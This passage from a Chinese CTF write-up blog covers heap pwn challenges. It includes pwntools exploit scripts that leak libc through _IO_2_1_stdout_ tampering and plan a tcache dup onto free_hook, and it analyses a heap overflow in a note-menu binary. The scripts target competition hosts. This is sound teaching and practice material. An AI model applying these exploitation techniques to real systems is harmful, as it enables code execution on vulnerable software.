string\">'/home/yhuan/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"47.112.189.16:34513\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name<span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\033[95m</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：\\033[91m0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\033[0m\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Size:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x7c5620</span><span class=\"token operator\">-</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#指定到_IO_2_1_stdout_ 的 flags 倒数弟 2 位。</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Size:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x200000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\">#申请一个靠 libc 的 chunk</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>se<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x18'</span><span class=\"token punctuation\">)</span>                       <span class=\"token comment\">#修改 flags 位置</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>se<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>                       <span class=\"token comment\">#修改 write_base 位置</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Data:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>libcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3c36e0</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4527a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf03a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1247</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>og <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x626f48</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>se<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>se<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7a\\x52\\x84'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>但是本地 patch 一直有问题，远程偏移就先不调了</p>\n<h2 id=\"pwn-mis\"><a class=\"markdownIt-Anchor\" href=\"#pwn-mis\">#</a> Pwn | mis</h2>\n<p>普通的菜单题</p>\n<p><img data-src=\"/img/24%E5%8F%A4%E5%89%91%E5%B1%B1/image-20241130163522164.png\" alt=\"image-20241130163522164\"></p>\n<h3 id=\"add\"><a class=\"markdownIt-Anchor\" href=\"#add\">#</a> add</h3>\n<p><img data-src=\"/img/24%E5%8F%A4%E5%89%91%E5%B1%B1/image-20241130163640141.png\" alt=\"image-20241130163640141\"></p>\n<p>使用 strdup 创建 chunk，输入多少字符创建的多大 chunk，而输入大小在 dword_202068 地址存放</p>\n<h3 id=\"dele\"><a class=\"markdownIt-Anchor\" href=\"#dele\">#</a> dele</h3>\n<p><img data-src=\"/img/24%E5%8F%A4%E5%89%91%E5%B1%B1/image-20241130163820510.png\" alt=\"image-20241130163820510\"></p>\n<p>没有 uaf</p>\n<h3 id=\"edit\"><a class=\"markdownIt-Anchor\" href=\"#edit\">#</a> edit</h3>\n<p><img data-src=\"/img/24%E5%8F%A4%E5%89%91%E5%B1%B1/image-20241130163958689.png\" alt=\"image-20241130163958689\"></p>\n<p>有堆溢出漏洞</p>\n<h3 id=\"show\"><a class=\"markdownIt-Anchor\" href=\"#show\">#</a> show</h3>\n<p><img data-src=\"/img/24%E5%8F%A4%E5%89%91%E5%B1%B1/image-20241130164257053.png\" alt=\"image-20241130164257053\"></p>\n<p>write 输出</p>\n<p>篡改 size 头，放入 unsortedbin，然后用头上的 chunk 的改的大一点输入大小给 libc 地址带出来，然后就 tcache dup 打 free_hook 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from pwncli import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-h'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-P'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"47.106.14.25:32234\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name<span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\033[95m</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：\\033[91m0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\033[0m\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'4.show\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'size: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'note: '</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tsla<span class=\"token 